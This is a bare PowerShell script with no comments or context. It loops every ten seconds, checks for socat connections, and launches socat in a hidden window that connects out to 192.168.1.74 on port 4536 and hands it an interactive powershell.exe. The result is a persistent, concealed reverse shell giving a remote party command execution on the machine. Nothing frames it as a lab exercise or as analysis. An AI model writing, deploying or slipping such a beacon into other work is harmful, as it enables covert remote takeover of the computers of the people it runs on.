$scriptBlock = [Scriptblock]::Create(@'
  if(Get-Process -Name socat | ForEach-Object { Get-NetTCPConnection -OwningProcess $_.Id -ErrorAction SilentlyContinue } ){
	Write-Host "running,..."
	Stop-Process -Name socat
	
	
}else{
	Write-Host "not running, bye bye..."	
	powershell.exe -windowstyle hidden .\socat -d -d TCP4:192.168.1.74:4536 EXEC:'powershell.exe',pipes
}
'@)
while($true){

Invoke-Command -ScriptBlock $scriptBlock
Start-Sleep -Seconds 10


}


